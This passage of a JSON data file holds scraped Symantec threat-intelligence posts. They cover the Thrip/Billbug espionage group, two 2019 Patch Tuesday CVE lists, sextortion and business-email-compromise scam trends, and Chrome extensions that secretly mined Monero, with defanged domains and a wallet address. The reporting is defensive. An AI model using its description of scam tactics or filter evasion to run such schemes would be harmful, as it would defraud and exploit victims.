(Infostealer.Catchamas), a custom Trojan deployed on selected computers of interest and designed to steal information. In addition to custom malware, Thrip has made extensive use of dual-use tools and living-off-the-land tactics. These include: Since Symantec first uncovered Thrip in 2018, we’ve found strong evidence linking it to the Billbug group. What ties the two groups together is the Sagerunex backdoor. This malware appears to be an evolution of an older Billbug tool known as Evora. By comparing strings and code flow between the two, we found that: Billbug is a long-established espionage group, active since at least January 2009. Similar to the Thrip sub-group, the wider Billbug group is known for specializing in operations against targets in South Asia. Billbug’s targets are usually compromised by either spear-phishing emails or watering hole attacks. The group’s spear-phishing attacks have tended to use exploits in Microsoft Office and PDF documents to drop its malware onto victims’ computers. To date, many of the group’s targets have been governments or military organizations. Thrip appears to have been undeterred by its exposure last year, continuing to mount espionage attacks against a wide range of targets in South East Asia. Its link to the Billbug group puts its activities into context and proves its attacks are part of a broader range of espionage activity heavily focused on (but not limited to) governments, armed forces, and communications providers. Symantec’s TAA was the catalyst for both our initial discovery of Thrip in 2018 and the discovery of new tools and victims in 2019. Without TAA’s artificial intelligence, it is quite likely that the group’s activities may have gone undetected for a lot longer. Symantec Endpoint Detection and Response (SEDR),which contains TAA technology, automatically detects Thrip-related activity. In addition to SEDR,Symantec’s Managed Endpoint Detection and Response (MEDR) serviceleverages automated attack hunting provided by analytics as well as Symantec analyst security expertise to remotely investigate and contain incursions by adversaries such as Thrip in Symantec customer networks. The following protections are also in place to protect customers against Thrip attacks: File-based protection Customers of theDeepSight Intelligence Managed Adversary and Threat Intelligence(MATI) service have received reports on Thrip and Billbug, which detail methods of detecting and thwarting activities of this group. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/thrip-apt-south-east-asia"
  },
  {
    "title": "microsoft patch tuesday august 2019",
    "content": "This month Microsoft has patched 93 vulnerabilities, 27 of which are rated Critical. As always, customers are advised to follow these security best practices: Microsoft's summary of the August 2019 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-1131)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-1133)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-1139)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-1140)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-1141)MS Rating: Critical Windows VBScript Engine Remote Code Execution Vulnerability(CVE-2019-1183)MS Rating: Critical Internet Explorer Remote Code Execution Vulnerability(CVE-2019-1194)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-1195)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-1196)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-1197)MS Rating: Critical Microsoft Edge Information Disclosure Vulnerability(CVE-2019-1030)MS Rating: Important MS XML Remote Code Execution Vulnerability(CVE-2019-1057)MS Rating: Important Microsoft Browsers Security Bypass Vulnerability(CVE-2019-1192)MS Rating: Important Internet Explorer Memory Corruption Vulnerability(CVE-2019-1193)MS Rating: Important Cumulative Security Update for Microsoft Office Microsoft Outlook Memory Corruption Vulnerability(CVE-2019-1199)MS Rating: Critical Microsoft Outlook Remote Code Execution Vulnerability(CVE-2019-1200)MS Rating: Critical Microsoft Word Remote Code Execution Vulnerability(CVE-2019-1201)MS Rating: Important Microsoft SharePoint Information Disclosure Vulnerability(CVE-2019-1202)MS Rating: Important Microsoft Office SharePoint XSS Vulnerability(CVE-2019-1203)MS Rating: Important Microsoft Outlook Privilege Escalation Vulnerability(CVE-2019-1204)MS Rating: Important Microsoft Word Remote Code Execution Vulnerability(CVE-2019-1205)MS Rating: Important Outlook iOS Spoofing Vulnerability(CVE-2019-1218)MS Rating: Important Cumulative Security Update for Microsoft Windows Kernel Windows Hyper-V Remote Code Execution Vulnerability(CVE-2019-0965)MS Rating: Critical Hyper-V Remote Code Execution Vulnerability(CVE-2019-0720)MS Rating: Critical Windows Kernel Privilege Escalation Vulnerability(CVE-2019-1159)MS Rating: Important Win32k Privilege Escalation Vulnerability(CVE-2019-1169)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2019-1227)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2019-1228)MS Rating: Important Cumulative Security Update for Microsoft Hyper-V Windows Hyper-V Denial of Service Vulnerability(CVE-2019-0714)MS Rating: Important Windows Hyper-V Denial of Service Vulnerability(CVE-2019-0715)MS Rating: Important Windows Hyper-V Denial of Service Vulnerability(CVE-2019-0717)MS Rating: Important Windows Hyper-V Denial of Service Vulnerability(CVE-2019-0718)MS Rating: Important Windows Hyper-V Denial of Service Vulnerability(CVE-2019-0723)MS Rating: Important Security Update for Microsoft Graphics Microsoft Graphics Remote Code Execution Vulnerability(CVE-2019-1149)MS Rating: Critical Microsoft Graphics Remote Code Execution Vulnerability(CVE-2019-1150)MS Rating: Critical Microsoft Graphics Remote Code Execution Vulnerability(CVE-2019-1151)MS Rating: Critical Microsoft Graphics Remote Code Execution Vulnerability(CVE-2019-1152)MS Rating: Critical Microsoft Graphics Remote Code Execution Vulnerability(CVE-2019-1144)MS Rating: Critical Microsoft Graphics Remote Code Execution Vulnerability(CVE-2019-1145)MS Rating: Critical Microsoft Graphics Component Information Disclosure Vulnerability(CVE-2019-1078)MS Rating: Important Windows Graphics Component Information Disclosure Vulnerability(CVE-2019-1143)MS Rating: Important Microsoft Graphics Component Information Disclosure Vulnerability(CVE-2019-1148)MS Rating: Important Microsoft Graphics Component Information Disclosure Vulnerability(CVE-2019-1153)MS Rating: Important Windows Graphics Component Information Disclosure Vulnerability(CVE-2019-1154)MS Rating: Important Windows Graphics Component Information Disclosure Vulnerability(CVE-2019-1158)MS Rating: Important Windows Kernel Elevation of Privilege Vulnerability(CVE-2019-1164)MS Rating: Important Security Update for Microsoft Windows Remote Desktop Services Remote Code Execution Vulnerability(CVE-2019-1226)MS Rating: Critical Remote Desktop Services Remote Code Execution Vulnerability(CVE-2019-1222)MS Rating: Critical Windows DHCP Server Remote Code Execution Vulnerability(CVE-2019-1213)MS Rating: Critical Remote Desktop Services Remote Code Execution Vulnerability(CVE-2019-1181)MS Rating: Critical LNK Remote Code Execution Vulnerability(CVE-2019-1188)MS Rating: Critical Remote Desktop Services Remote Code Execution Vulnerability(CVE-2019-1182)MS Rating: Critical Windows DHCP Client Remote Code Execution Vulnerability(CVE-2019-0736)MS Rating: Critical Windows Denial of Service Vulnerability(CVE-2019-0716)MS Rating: Important Microsoft Defender Privilege Escalation Vulnerability(CVE-2019-1161)MS Rating: Important Windows ALPC Privilege Escalation Vulnerability(CVE-2019-1162)MS Rating: Important Windows File Signature Security Bypass Vulnerability(CVE-2019-1163)MS Rating: Important Microsoft Windows p2pimsvc Privilege Escalation Vulnerability(CVE-2019-1168)MS Rating: Important Windows Shell Privilege Escalation Vulnerability(CVE-2019-1170)MS Rating: Important SymCrypt Information Disclosure Vulnerability(CVE-2019-1171)MS Rating: Important Windows Information Disclosure Vulnerability(CVE-2019-1172)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2019-1173)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2019-1174)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2019-1175)MS Rating: Important DirectX Privilege Escalation Vulnerability(CVE-2019-1176)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2019-1177)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2019-1178)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2019-1179)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2019-1180)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2019-1184)MS Rating: Important Windows Subsystem for Linux Privilege Escalation Vulnerability(CVE-2019-1185)MS Rating: Important Windows Privilege Escalation Vulnerability(CVE-2019-1186)MS Rating: Important XmlLite runtime Denial of Service Vulnerability(CVE-2019-1187)MS Rating: Important Windows Image Privilege Escalation Vulnerability(CVE-2019-1190)MS Rating: Important Microsoft Windows Privilege Escalation Vulnerability(CVE-2019-1198)MS Rating: Important Windows DHCP Server Remote Code Execution Vulnerability(CVE-2019-1206)MS Rating: Important Windows DHCP Server Denial of Service Vulnerability(CVE-2019-1212)MS Rating: Important Bluetooth Key Length Enforcement(CVE-2019-9506)MS Rating: Important HTTP/2 Server Denial of Service Vulnerability(CVE-2019-9511)MS Rating: Important HTTP/2 Server Denial of Service Vulnerability(CVE-2019-9513)MS Rating: Important HTTP/2 Server Denial of Service Vulnerability(CVE-2019-9514)MS Rating: Important Windows Remote Desktop Protocol (RDP) Denial of Service Vulnerability(CVE-2019-1223)MS Rating: Important Remote Desktop Protocol Server Information Disclosure Vulnerability(CVE-2019-1224)MS Rating: Important Remote Desktop Protocol Server Information Disclosure Vulnerability(CVE-2019-1225)MS Rating: Important Dynamics On-Premise Elevation of Privilege Vulnerability(CVE-2019-1229)MS Rating: Important HTTP/2 Server Denial of Service Vulnerability(CVE-2019-9512)MS Rating: Important HTTP/2 Server Denial of Service Vulnerability(CVE-2019-9518)MS Rating: Important Security Update for Jet Database Engine Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-1155)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-1156)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-1157)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-1146)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-1147)MS Rating: Important Security Update for Visual Studio Git for Visual Studio Privilege Escalation Vulnerability(CVE-2019-1211)MS Rating: Important More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Preethi Koroth is a member of Symantec's Cyber Security Services organization which provides round-the-clock monitoring and protection services against cyber attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-august-2019"
  },
  {
    "title": "email extortion scams",
    "content": "An email arrives in your inbox, with one of your old passwords in the Subject line. Your curiosity is piqued, and you click into the message, only to discover that someone has allegedly hacked your webcam and recorded you engaged in some intimate acts, and they are now threatening to send this recording to everyone in your contact list. However, if you send the anonymous blackmailer a few hundred dollars in bitcoins they promise that no one will see the embarrassing footage. This is a situation many people found themselves in over the last year, as we witnessed a revival and evolution in email extortion scams, which are exactly what they sound like: scam emails that attempt to extort cash from victims. These sorts of scams have been around for many years, but the scenario outlined above—often referred to as a \"sextortion\" scam—is one of the main types of extortion scams we have started seeing more frequently again since about mid-2018. When we look at the number of these kinds of scams that have been blocked by Symantec since the start of this year, we can see the trend is going upwards, with a spike visible during a two-week period in February especially notable. Between January 1 and May 29, 2019, just under 289 million of these types of emails were blocked by Symantec technologies. Just over 85 million of these emails (almost 30 percent) were blocked during this 17-day period in February when we saw a big spike in these types of scams. We didn’t just see a surge in one particular type of scam in this period, but a surge in a few different variations of extortion scam emails, including: Most of these sextortion-style scams follow largely the same pattern, with variations in the messages such as using attachments or obfuscated characters, etc., applied in an attempt by attackers to evade email protection technologies. For example, some spam filters might work by blocking emails with Bitcoin addresses in the body—hence why attackers may have then turned to using PDF attachments or obfuscated text to try to bypass the spam filter. Most of these emails also contain a password or partial phone number previously (or perhaps still) associated with the email address the email is sent to. This is included to make it appear the attacker has access to private information about the recipient—when in fact they almost certainly obtained it from one of the many large password dumps of recent years. In most of these scam emails, the attacker claims to have a recording of you visiting a porn website, though in some cases the attacker pretends to be a member of law enforcement who has found child pornography on your device. The big exception to this is the bomb scare emails, where the sender claims to have planted a bomb in your building that will be triggered if the requested amount of money is not paid. Some of the typical characteristics and features we have seen in these spam emails are outlined in the table below. When it comes to the success of these scams, if we examine the 5,000 most-seen Bitcoin addresses in May, we can see that 63 of those wallets received bitcoins in 243 transactions. In total, the wallets received 12.8 bitcoins in that period—at the end of May one bitcoin was worth approximately US$8,300, meaning these wallets received a total of approximately US$106,240. If we take that as an average amount to make in a 30-day period for these kinds of scams, it means they are making just over US$1.2 million in a year ($1,292,586). For the amount of effort and skill that is required to carry out these scams, it represents a pretty good return on investment. Almost all these wallets had been cleared out when we examined them at the end of May—it appears the criminals involved are not leaving any funds in these wallets for too long. These scams don’t appear to be targeted—they are sent out as part of automated mass-mailing campaigns, seemingly using email and password combinations found in the many data dumps of recent years. The Necurs botnet was evenreportedly being used to send these scamsat one point. Some of these scams were reportedly also being used to spread the now-apparently-retired GandCrab ransomware, giving cyber criminals two chances to scam victims out of money. As these email extortion scams are typical cyber crime activity, it is not clear exactly who is behind these attacks, but Symantec believes that a minimum of two cyber crime groups are engaged in this kind of activity, though there are potentially also many others. The barriers to entry for criminals are quite low for these scams—they do not necessarily require a huge degree of technical knowledge, and criminals only need a small percentage of them to be successful to make a profit. These scams are still being actively sent, so consumers should be aware of these scams and the steps they can take to avoid falling victim to them. Symantec proactively protects against email extortion scams with its email security suite of products: Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/email-extortion-scams"
  },
  {
    "title": "bec scams trends and themes 2019",
    "content": "Business email compromise (BEC) scams are not going away anytime soon. For such a relatively low-tech type of financial fraud, it has proved to be a high-yield and lucrative enterprise for scammers. BEC scams—also known as email account compromise (EAC), CEO fraud, or whaling—have been around since at least 2013. Between October 2013 and May 2018, more than $12 billion in domestic and international losses were attributed by the FBI to BEC scams. According to the FBI's latestInternet Crime Report (ICR), losses from BEC scams amounted to almost $1.3 billion in 2018. This is double the losses in 2017, which stood at $676 million. In 2018, the FBI's Internet Crime Complaint Center (IC3) also received 20,373 BEC-related complaints, which is up from 15,690 complaints in 2017. Aggregate losses from internet-enabled theft, fraud, and exploitation reached $2.7 billion in 2018, and losses from BEC scams accounted for almost one-half of this figure. The FBI alsosaid in a July 2018 public service announcement that, based on the financial data, banks located in China and Hong Kong were the primary destinations of fraudulent funds, while financial institutions in the UK, Mexico, and Turkey were also prominent destinations. The good news is that the IC3's Recovery Asset Team (RAT), which was formed in February 2018, has successfully recovered more than $192 million lost to BEC scams, representing a recovery rate of 75 percent. The RAT reportedly dealt with 1,061 incidents that caused losses of more than $257 million. Given this dramatic rise in actual BEC-related losses as well as complaints, we wanted to examine BEC scams more closely. Is the number of BEC emails sent daily growing? How many businesses are targeted by BEC scams each month? Which regions are most targeted by these scams? According to Symantec telemetry, the average daily volume of BEC emails was significantly higher in the first quarter of this year than in the same period last year. From January to March 2018, the average daily BEC email volume was 85,816, while from January to March 2019, the average daily volume was 128,700—a 50 percent increase. We found that an average of 6,029 organizations were targeted by BEC emails per month during the last 12 months, from July 2018 through June 2019. BEC scams could have potentially affected this many businesses monthly were these attacks not blocked. This indicates that BEC scammers have slightly reduced their targets, as an average of 6,089 businesses were targeted per month in the previous 12 months. We also found that businesses received an average of five BEC scam emails each month during the past 12 months. This means each business had a 17 percent chance of getting at least one BEC email per month. In the previous 12 months, an organization would have received an average of four BEC emails per month. In which regions are these targeted businesses located? The top 10 regions targeted by BEC scammers in the last 12 months are led by the U.S. (39 percent), followed by the UK (26 percent), Australia (11 percent), Belgium (3 percent), Germany (3 percent), Canada (2 percent), the Netherlands (2 percent), Hong Kong (2 percent), Singapore (2 percent), and Japan (1 percent). One interesting metric we looked at was the most popular Subject lines used in BEC emails in the last 12 months and in which victim regions these were used. BEC scams targeted at the UK and the U.S. were mostly labeled \"Important,\" while most BEC scams that hit Australia, Spain, France, and Germany had payment-related themes. We also looked at the 10 most popular keywords used in BEC emails in the last 12 months. \"Transaction request\" topped the list with 39,368 instances observed, followed by \"Important\" (37,477) and \"Urgent\" (33,391). There were three iterations of \"Payment\" that rounded up the top 10, including \"Outstanding payment\" and \"Notification of payment received.\" Almost all of the keywords are meant to call the attention of the recipient or induce a sense of urgency with finance-related themes. Email scammers have been known to use so-called cousin domains—for example \"sym@ntec.com\" instead of \"symantec.com\". BEC scammers appear to have gone easy on these cousin domains in the last 12 months, and have gone back to using free web accounts and web mailers, such as gmail.com, yahoo.com, aol.com, and inbox.lv. Using and/or spoofing such legitimate domains also lends legitimacy to the scam. Four popular email services—including Gmail, AOL, Yahoo! Mail, and Hotmail—are among the 10 top most abused domains from which BEC emails are sent, with Gmail and AOL bearing the brunt. What's most surprising here is that AOL, which experienced a sharp decline in subscribers back in 2007, apparently remains a top choice for BEC scammers. Let's take a closer look at the BEC emails themselves. We have noted recent changes in BEC message composition, with scammers building on previous ideas, getting more creative, and using newer themes, such as: This observation aligns with that of the FBI's, as the IC3 report found that in 2018, there was an increase in the number of BEC complaints requesting victims purchase gift cards. According to the report, the victims received a spoofed email, call, or text from a person in authority requesting that the victim purchase multiple gift cards for either personal or business reasons. Specifically, Symantec's Security Response team observed that the 10 most popular themes carried by BEC emails in the last 12 months include: BEC scams are said to have begun with the hacking or spoofing of CEOs' or CFOs' email accounts, with scammers sending fraudulent emails typically to a company’s finance department an' tricking employees into making wire transfer payments. A combination of email spoofing, computer intrusion, and social engineering is required to pull off this type of scam. These scams have been constantly evolving, with scammers getting craftier and growing more sophisticated each year. This year alone, we have seenFacebook and Google getting defrauded of $100 million; Chinese fraudstersstealing $18.6 million from the Indian arm of an Italian engineering company; and BEC gangsexpanding geographic targetsandidentifying new victims, such as universities, the Salvation Army, and Boy Scouts of America. Even a small church in Ohiowas not spared. What lies ahead for BEC scams? As artificial intelligence (AI) and machine learning (ML) become more developed, we may very well see BEC scammers adopting these technologies in the near future to make their attacks even more convincing. Both ML and AI could be used to power audiovisual \"deepfakes\" that target or impersonate C-Suite executives. Already we have seen deepfakes that use only audio, as it is easier to leverage than both audio and visual elements. A BEC scammer using ML/AI could target an organization's senior financial executive or employee who has direct access to the CEO and who could authorize money transfers. When the employee tries to verify the request, the scammer might use audio featuring the CEO—such as earning calls, YouTube footage, TED talks, and other previous recordings—to fool the employee into believing it is indeed the CEO's voice on the other end ordering the transfer. The employee could then execute the request fully believing it was legitimate. While this is a scary prospect, future BEC scam scenarios may just play out this way. Symantec recommends the following best practices to protect your organization from BEC scams: Symantec customers are already protected from BEC scams with the following solutions in place: Special thanks to Vijay Thaware for his inputs on this blog. Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/bec-scams-trends-and-themes-2019"
  },
  {
    "title": "cryptojacking extensions chrome web store",
    "content": "On May 8, we discovered two extensions for Google’s Chrome web browser that secretly perform coin mining after they are installed. Both extensions were found on the official Google Chrome Web Store. One of the extensions, called2048, is a version of apopular math-based strategy game. The extension was published in August 2017 and has over 2,100 users, which suggests the publisher has made some profit using the CPU cycles of those users to mine for cryptocurrency. The other extension, Mp3 Songs Download, claims to be an MP3 downloader but just redirects the user to an MP3 download website when they click on the extension button. The MP3 download website secretly launches a coin-mining script in the background. The Mp3 Songs Download extension was published in June 2017 and has around 4,000 users. Coin-mining script:2048 The source code for the2048extension contains a hardcoded domain that is triggered when Chrome is launched. The form in http://www.madafak[DOT]in/landing sends a POST request with a hidden field to www.madafak[DOT]in after one second. The main page www.madafak[DOT]in attempts to pass itself off as Google Analytics but it secretly loads a coinminer library (ga.js) in the background. From the script shown in Figure 7 we can see that the coinminer mines Monero, throttles CPU usage at 0.5 (50 percent), and contains a hardcoded Monero wallet address (5bdd3443937ebe08d3e3c99e9524afc13702eba28340). Coin-mining script:Mp3 Songs Download The extension Mp3 Songs Download doesn’t start its coin-mining script until the user clicks on the extension button and is redirected to a website. As the JavaScript in Figure 8 shows, the extension redirects the user to http://mp3song-s[DOT]com. This website looks just like a normal MP3 download site (Figure 9) and actually functions as one. However, it also loads coin-mining JavaScript (VEZ4.js) secretly, which can be seen in the website’s source code (Figure 10). From the source code we can also see the hardcoded wallet key and throttling ratio, which is set at 0, meaning 100 percent of the user’s CPU cycles can be used for mining. The coin mining will persist for as long as the browser (with the2048extension installed) or website (in the case of theMp3 Songs Downloadextension) remains open. The effects of this activity could include device slowdown, overheating batteries, increased energy consumption, and even devices becoming unusable. Figure 11 shows our test computer’s CPU usage spiking at 100 percent after theMp3 Songs Downloadextension was installed. Furthermore, the malicious activity of these extensions is made harder to detect by the fact that they function as described. For example, the game 2048 is playable just like any 2048 game and the MP3 website contains downloadable MP3 files. This means that many users will not be suspicious and may not realize their computing power is being hijacked to make money for the developers behind these extensions. We notified Google about these coin-mining extensions and they have now been removed from the Google Chrome Web Store. Symantec and Norton products detect the extensions as the following: Yuanjing is a member of Symantec's Security Technology and Response team who are focused on researching and developing automation technologies in mobile security. Tommy is a member of Symantec's Security Technology and Response team who are focused on researching and providing protection against current and future cyber threats. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/cryptojacking-extensions-chrome-web-store"
  },
  {
    "title": "microsoft patch tuesday june 2019",
    "content": "As always, customers are advised to follow these security best practices: Microsoft's summary of the June 2019 releases can be found here:https://portal.msrc.microsoft.com/en-us/security-guidance This month's update covers vulnerabilities in: The following is a breakdown of the issues being addressed this month: Cumulative Security Update for Microsoft Browsers Microsoft Edge Security Feature Bypass Vulnerability(CVE-2019-1054)MS Rating: Important Microsoft Browser Memory Corruption Vulnerability(CVE-2019-1038)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0989)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0991)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0992)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-0993)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-1002)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-1003)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-1024)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-1051)MS Rating: Critical Chakra Scripting Engine Memory Corruption Vulnerability(CVE-2019-1052)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0920)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-0988)MS Rating: Critical Scripting Engine Information Disclosure Vulnerability(CVE-2019-0990)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-1055)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-1080)MS Rating: Critical Scripting Engine Memory Corruption Vulnerability(CVE-2019-1005)MS Rating: Important Scripting Engine Information Disclosure Vulnerability(CVE-2019-1023)MS Rating: Important Microsoft Browser Information Disclosure Vulnerability(CVE-2019-1081)MS Rating: Important Cumulative Security Update for Microsoft Office Microsoft Office SharePoint XSS Vulnerability(CVE-2019-1031)MS Rating: Important Microsoft Office SharePoint XSS Vulnerability(CVE-2019-1032)MS Rating: Important Microsoft Office SharePoint XSS Vulnerability(CVE-2019-1033)MS Rating: Important Microsoft Office SharePoint XSS Vulnerability(CVE-2019-1036)MS Rating: Important Microsoft Word Remote Code Execution Vulnerability(CVE-2019-1034)MS Rating: Important Microsoft Word Remote Code Execution Vulnerability(CVE-2019-1035)MS Rating: Important Cumulative Security Update for Microsoft Windows Kernel Win32k Elevation of Privilege Vulnerability(CVE-2019-0960)MS Rating: Important Win32k Elevation of Privilege Vulnerability(CVE-2019-1014)MS Rating: Important Win32k Elevation of Privilege Vulnerability(CVE-2019-1017)MS Rating: Important Windows Kernel Information Disclosure Vulnerability(CVE-2019-1039)MS Rating: Important Windows Kernel Elevation of Privilege Vulnerability(CVE-2019-1041)MS Rating: Important Windows Secure Kernel Mode Security Feature Bypass Vulnerability(CVE-2019-1044)MS Rating: Important Windows Kernel Elevation of Privilege Vulnerability(CVE-2019-1065)MS Rating: Important Cumulative Security Update for Microsoft Windows Hyper-V Windows Hyper-V Remote Code Execution Vulnerability(CVE-2019-0620)MS Rating: Critical Windows Hyper-V Remote Code Execution Vulnerability(CVE-2019-0722)MS Rating: Critical Windows Hyper-V Denial of Service Vulnerability(CVE-2019-0713)MS Rating: Important Windows Hyper-V Remote Code Execution Vulnerability(CVE-2019-0709)MS Rating: Critical Windows Hyper-V Denial Of Service Vulnerability(CVE-2019-0710)MS Rating: Important Windows Hyper-V Denial Of Service Vulnerability(CVE-2019-0711)MS Rating: Important Cumulative Security Update for Microsoft Windows Jet Database Engine Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0904)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0905)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0906)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0907)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0908)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0909)MS Rating: Important Jet Database Engine Remote Code Execution Vulnerability(CVE-2019-0974)MS Rating: Important Cumulative Security Update for Microsoft Windows Graphics Device Interface (GDI) Windows GDI Information Disclosure Vulnerability(CVE-2019-1009)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-1010)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-1011)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-1012)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-1013)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-1015)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-1016)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-1046)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-1047)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-1048)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-1049)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-1050)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-0968)MS Rating: Important Windows GDI Information Disclosure Vulnerability(CVE-2019-0977)MS Rating: Important Cumulative Security Update for Microsoft Windows Windows Audio Service Elevation of Privilege Vulnerability(CVE-2019-1021)MS Rating: Important Windows Audio Service Elevation of Privilege Vulnerability(CVE-2019-1022)MS Rating: Important Windows Audio Service Elevation of Privilege Vulnerability(CVE-2019-1026)MS Rating: Important Windows Audio Service Elevation of Privilege Vulnerability(CVE-2019-1027)MS Rating: Important Windows Audio Service Elevation of Privilege Vulnerability(CVE-2019-1028)MS Rating: Important Windows Audio Service Elevation of Privilege Vulnerability(CVE-2019-1007)MS Rating: Important ActiveX Data Objects (ADO) Remote Code Execution Vulnerability(CVE-2019-0888)MS Rating: Critical Microsoft Speech API Remote Code Execution Vulnerability(CVE-2019-0985)MS Rating: Critical Microsoft IIS Server Denial of Service Vulnerability(CVE-2019-0941)MS Rating: Important Windows ALPC Elevation of Privilege Vulnerability(CVE-2019-0943)MS Rating: Important Windows Event Viewer Information Disclosure Vulnerability(CVE-2019-0948)MS Rating: Moderate Windows Common Log File System Driver Elevation of Privilege Vulnerability(CVE-2019-0959)MS Rating: Important Local Security Authority Subsystem Service Denial of Service Vulnerability(CVE-2019-0972)MS Rating: Important Windows Installer Elevation of Privilege Vulnerability(CVE-2019-0973)MS Rating: Important Windows Storage Service Elevation of Privilege Vulnerability(CVE-2019-0983)MS Rating: Important Windows Common Log File System Driver Elevation of Privilege Vulnerability(CVE-2019-0984)MS Rating: Important Windows User Profile Service Elevation of Privilege Vulnerability(CVE-2019-0986)MS Rating: Important Windows Storage Service Elevation of Privilege Vulnerability(CVE-2019-0998)MS Rating: Important DirectX Elevation of Privilege Vulnerability(CVE-2019-1018)MS Rating: Important Microsoft Windows Security Feature Bypass Vulnerability(CVE-2019-1019)MS Rating: Important Windows Denial of Service Vulnerability(CVE-2019-1025)MS Rating: Important Windows NTLM Tampering Vulnerability(CVE-2019-1040)MS Rating: Important Comctl32 Remote Code Execution Vulnerability(CVE-2019-1043)MS Rating: Important Windows Network File System Elevation of Privilege Vulnerability(CVE-2019-1045)MS Rating: Important Windows Shell Elevation of Privilege Vulnerability(CVE-2019-1053)MS Rating: Important Windows Elevation of Privilege Vulnerability(CVE-2019-1064)MS Rating: Important Task Scheduler Elevation of Privilege Vulnerability(CVE-2019-1069)MS Rating: Important Security Update for Skype for Business and Lync Server Skype for Business and Lync Server Denial of Service Vulnerability(CVE-2019-1029)MS Rating: Important Security Update for Azure Azure DevOps Server Spoofing Vulnerability(CVE-2019-0996)MS Rating: Important More information is available on Symantec's freeSecurity Centerportal and to our customers through the DeepSight Threat Management System. Himanshu is a senior member of Symantec's Cyber Security Services organization. An active contributor to numerous security communities, he frequently provides insight on vulnerabilities and shares his knowledge by writing reports, blogs, and journals. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/microsoft-patch-tuesday-june-2019"
  },
  {
    "title": "twitterbots propaganda disinformation",
